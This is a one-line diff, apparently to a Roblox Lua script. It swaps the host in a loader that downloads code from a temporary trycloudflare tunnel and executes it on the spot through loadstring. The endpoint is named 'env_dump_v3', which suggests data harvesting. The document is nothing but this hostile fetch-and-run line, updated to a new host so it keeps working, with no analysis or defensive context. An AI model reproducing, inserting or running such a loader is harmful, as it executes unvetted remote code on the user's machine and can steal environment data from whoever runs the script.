@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://ssl-functions-selection-guestbook.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://stylus-laundry-cuisine-prints.trycloudflare.com/env_dump_v3"))()
